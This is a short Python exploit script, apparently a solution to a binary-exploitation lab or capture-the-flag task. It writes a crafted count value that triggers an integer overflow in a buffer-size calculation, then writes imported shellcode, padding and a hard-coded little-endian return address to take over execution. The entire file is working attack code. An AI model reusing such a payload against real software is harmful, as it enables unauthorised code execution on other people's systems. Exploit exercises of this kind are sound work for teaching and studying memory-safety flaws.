#should make buffer become 64 bytes in size -> 134217729

from shellcode import shellcode
import sys

amount = int.to_bytes(1073741836, 32, "little")
sys.stdout.buffer.write(amount)

sys.stdout.buffer.write(shellcode + b"\x32" *11 + b"\xdc\xfb\xf6\xff")

